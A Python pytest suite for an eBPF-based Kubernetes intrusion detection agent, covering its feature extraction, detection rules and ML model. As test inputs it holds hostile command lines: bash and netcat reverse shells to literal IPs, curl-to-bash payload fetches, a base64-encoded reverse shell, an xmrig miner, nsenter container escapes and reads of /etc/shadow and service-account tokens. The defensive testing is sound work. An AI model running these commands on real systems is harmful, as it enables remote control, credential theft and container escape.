"""Unit tests for collection, feature extraction, rules and ML detection."""
import os
import sys

import numpy as np
import pytest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))

from ids_agent import rules  # noqa: E402
from ids_agent.collector import normalise  # noqa: E402
from ids_agent.enrichment import RE_CONTAINER_ID, RE_POD_UID, workload_of  # noqa: E402
from ids_agent.features import FEATURE_NAMES, BehaviorTracker, extract  # noqa: E402

MODEL = os.path.join(HERE, "..", "..", "..", "ml", "model", "ids_model.joblib")


def ev(**kw):
    base = dict(event_type="exec", comm="", parent_comm="sh", uid=0, path="", cmdline="", argc=0, flags=0,
                dport=0, daddr="", namespace="shop")
    base.update(kw)
    return base


def exe(path, argv, parent="sh", **kw):
    return ev(event_type="exec", comm=os.path.basename(path)[:15], parent_comm=parent, path=path,
              cmdline=" ".join(argv), argc=len(argv), **kw)


def feats(e, win=None):
    return dict(zip(FEATURE_NAMES, extract(e, win)))


# ---------------------------------------------------------------- collector
def test_normalise_exec_and_connect():
    raw = {"kind": "event", "type": "exec", "ts_ns": 10, "cgroup_id": 5, "pid": 7, "ppid": 1, "uid": 0, "arg_num": 0,
           "family": 0, "dport": 0, "daddr": "", "comm": "cat", "pcomm": "bash", "path": "/usr/bin/cat",
           "argv": ["cat", "/etc/shadow"]}
    e = normalise(raw, 1000)
    assert e["cmdline"] == "cat /etc/shadow" and e["argc"] == 2 and e["parent_comm"] == "bash" and e["wall_ns"] == 1010
    c = normalise({**raw, "type": "connect", "family": 2, "daddr": "1.2.3.4", "dport": 4444, "argv": []}, 0)
    assert c["daddr"] == "1.2.3.4" and c["cmdline"] == ""
    u = normalise({**raw, "type": "connect", "family": 1, "daddr": "", "path": "/var/run/docker.sock", "argv": []}, 0)
    assert u["daddr"] == "" and u["path"] == "/var/run/docker.sock"


# ---------------------------------------------------------------- v0 bug regressions
def test_runc_is_not_netcat():
    """v0 flagged /usr/sbin/runc because 'runc' contains 'nc'."""
    f = feats(exe("/usr/sbin/runc", ["runc", "init"], parent="containerd-shim"))
    assert f["bin_is_net_tool"] == 0 and f["proc_is_k8s_component"] == 1


def test_dev_substring_is_not_suspicious_dir():
    """v0 treated any path containing '/dev' (e.g. /usr/lib/x/devtools) as suspicious."""
    assert feats(exe("/usr/lib/devtools/bin/tool", ["tool"]))["bin_in_tmp"] == 0
    assert feats(exe("/dev/shm/.x", ["/dev/shm/.x"]))["bin_in_tmp"] == 1


def test_features_use_full_argv():
    """v0 only captured the binary path, so argument-based features never fired at runtime."""
    f = feats(exe("/bin/bash", ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"]))
    assert f["args_reverse_shell"] and f["has_dev_tcp"] and f["has_ip_literal"]


def test_wait_for_is_not_reverse_shell():
    f = feats(exe("/usr/bin/nc", ["nc", "-z", "-w", "2", "postgres", "5432"]))
    assert f["bin_is_net_tool"] == 1 and f["args_reverse_shell"] == 0
    f = feats(exe("/bin/bash", ["bash", "-c", "cat < /dev/null > /dev/tcp/db/5432"]))
    assert f["has_dev_tcp"] == 1 and f["args_reverse_shell"] == 0


def test_base64_blob_vs_long_path():
    assert feats(exe("/bin/sh", ["sh", "-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ== | base64 -d | sh"]))[
        "has_base64_blob"] == 1
    assert feats(exe("/usr/lib/postgresql/15/bin/postgres", ["postgres", "-D", "/var/lib/postgresql/data"]))[
        "has_base64_blob"] == 0


# ---------------------------------------------------------------- rules
def rule_ids(e):
    return {r.id for r in rules.evaluate(e, feats(e))}


def test_rules_fire_on_attacks():
    assert "R001" in rule_ids(exe("/usr/bin/nc", ["nc", "-e", "/bin/sh", "1.2.3.4", "4444"]))
    assert "R003" in rule_ids(ev(event_type="open", comm="cat", path="/var/run/secrets/kubernetes.io/serviceaccount/token"))
    assert "R004" in rule_ids(ev(event_type="open", comm="python3", path="/etc/shadow"))
    assert "R006" in rule_ids(exe("/bin/sh", ["sh", "-c", "curl -s http://1.2.3.4/x | bash"]))
    assert "R010" in rule_ids(ev(event_type="chmod", comm="chmod", path="/bin/bash", flags=0o4755))
    assert "R014" in rule_ids(exe("/usr/bin/nsenter", ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "sh"]))
    assert "R014" in rule_ids(ev(event_type="connect", comm="curl", path="/var/run/docker.sock"))
    assert "R017" in rule_ids(ev(event_type="connect", comm="curl", daddr="10.0.0.9", dport=10250))
    assert "R019" in rule_ids(ev(event_type="setuid", comm="exploit", uid=1000, flags=0))


def test_rules_quiet_on_platform_behaviour():
    assert not rule_ids(ev(event_type="open", comm="coredns", namespace="kube-system",
                           path="/var/run/secrets/kubernetes.io/serviceaccount/token"))
    assert not rule_ids(ev(event_type="open", comm="unix_chkpwd", path="/etc/shadow"))
    assert not rule_ids(ev(event_type="connect", comm="kube-apiserver", namespace="kube-system", daddr="10.0.0.2",
                           dport=10250))
    assert not rule_ids(ev(event_type="memfd", comm="runc", path="runc_cloned:/proc/self/exe"))
    assert not rule_ids(ev(event_type="unshare", comm="runc:[1:CHILD]", flags=0x20000 | 0x10000000))
    assert not rule_ids(exe("/tmp/go-build123/b001/exe/main", ["main"], parent="go"))
    assert not rule_ids(ev(event_type="chmod", comm="chmod", path="/usr/local/bin/kubectl", flags=0o755))


# ---------------------------------------------------------------- behaviour window
def test_behaviour_tracker_window_and_new_binary():
    t = [0.0]
    tr = BehaviorTracker(window=60, warmup=100, clock=lambda: t[0])
    w = tr.observe("c1", "wl", exe("/bin/ls", ["ls"]))
    assert w["win_exec_count"] == 1 and w["win_new_binary"] == 0  # warm-up
    t[0] = 200
    w = tr.observe("c1", "wl", exe("/usr/bin/nmap", ["nmap"]))
    assert w["win_new_binary"] == 1 and w["win_exec_count"] == 1  # old exec left the window
    assert tr.observe("c1", "wl", exe("/usr/bin/nmap", ["nmap"]))["win_new_binary"] == 0
    w = tr.observe("c1", "wl", ev(event_type="connect", comm="nmap", daddr="10.0.0.1", dport=22))
    assert w["win_connect_count"] == 1 and w["win_distinct_dst"] == 1


# ---------------------------------------------------------------- pod/container identification
def test_cgroup_regexes_and_workloads():
    systemd = "/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod1b2c3d4e_aaaa_bbbb_cccc_0123456789ab.slice/" \
              "docker-" + "a" * 64 + ".scope"
    assert RE_POD_UID.search(systemd).group(1).replace("_", "-") == "1b2c3d4e-aaaa-bbbb-cccc-0123456789ab"
    assert RE_CONTAINER_ID.search(systemd.rsplit("/", 1)[-1]).group(1) == "a" * 64
    pod = {"metadata": {"name": "web-7d9f-abcde", "labels": {"pod-template-hash": "7d9f"},
                        "ownerReferences": [{"kind": "ReplicaSet", "name": "web-7d9f", "controller": True}]}}
    assert workload_of(pod) == ("Deployment", "web")
    assert workload_of({"metadata": {"name": "j", "ownerReferences": [{"kind": "Job", "name": "backup-28401234"}]}}) == \
        ("CronJob", "backup")


# ---------------------------------------------------------------- trained model
@pytest.fixture(scope="module")
def detector():
    if not os.path.exists(MODEL):
        pytest.skip("model not trained (run ml/train_model.py)")
    from ids_agent.detector import Detector
    return Detector(MODEL)


ATTACKS = [
    exe("/bin/bash", ["bash", "-c", "bash -i >& /dev/tcp/45.33.2.1/4444 0>&1"], parent="java"),
    exe("/tmp/.x/xmrig", ["xmrig", "-o", "stratum+tcp://pool.minexmr.com:4444", "-u", "4abc", "-p", "x"]),
    exe("/usr/bin/nsenter", ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash"]),
    ev(event_type="open", comm="cat", path="/var/run/secrets/kubernetes.io/serviceaccount/token"),
    exe("/bin/sh", ["sh", "-c", "curl -s http://185.2.3.4/payload | bash"], parent="nginx"),
]
BENIGN = [
    exe("/usr/sbin/nginx", ["nginx", "-g", "daemon off;"], parent="containerd-shim"),
    exe("/usr/bin/curl", ["curl", "-fsS", "http://127.0.0.1:8080/health"], parent="runc"),
    ev(event_type="connect", comm="java", daddr="10.244.0.12", dport=5432, parent_comm="containerd-shim"),
    ev(event_type="open", comm="coredns", namespace="kube-system",
       path="/var/run/secrets/kubernetes.io/serviceaccount/token", flags=0o2000000),
    exe("/usr/bin/nc", ["nc", "-z", "-w", "2", "postgres", "5432"]),
]
QUIET = {"win_exec_count": 2, "win_distinct_bins": 2, "win_connect_count": 3, "win_distinct_dst": 1}
NOISY = {"win_exec_count": 25, "win_distinct_bins": 12, "win_connect_count": 4, "win_distinct_dst": 2,
         "win_shell_count": 6, "win_new_binary": 1}


def test_model_separates_attacks_from_benign(detector):
    X = np.asarray([extract(e, NOISY) for e in ATTACKS] + [extract(e, QUIET) for e in BENIGN], dtype=np.float32)
    p, cats = detector.predict(X)
    assert all(p[: len(ATTACKS)] >= detector.threshold), p
    assert all(p[len(ATTACKS):] < detector.threshold), p
    assert cats[1] == "crypto_miner"


def test_assess_produces_alert_with_mitre(detector):
    e = ATTACKS[0]
    fv = extract(e, NOISY)
    p, cats = detector.predict(np.asarray([fv], dtype=np.float32))
    d = detector.assess(e, {"namespace": "shop"}, fv, float(p[0]), cats[0])
    assert d["suspicious"] and d["severity"] == "High" and "T1059.004" in d["mitre"]
    assert any(r["id"] == "R001" for r in d["rules"])


def test_platform_namespace_needs_high_confidence(detector):
    """Regression (seen live): the dashboard's nginx proxying to the backend on :8000."""
    e = ev(event_type="connect", comm="nginx", parent_comm="nginx", daddr="10.108.30.152", dport=8000,
           namespace="ebpf-ids", uid=101)
    fv = extract(e, QUIET)
    assert not detector.assess(e, {"namespace": "ebpf-ids"}, fv, 0.6, "reverse_shell")["suspicious"]
    assert detector.assess(e, {"namespace": "ebpf-ids"}, fv, 0.9, "reverse_shell")["suspicious"]
    # outside platform namespaces the normal threshold applies
    e2 = dict(e, namespace="shop")
    assert detector.assess(e2, {"namespace": "shop"}, extract(e2, QUIET), 0.6, "reverse_shell")["suspicious"]
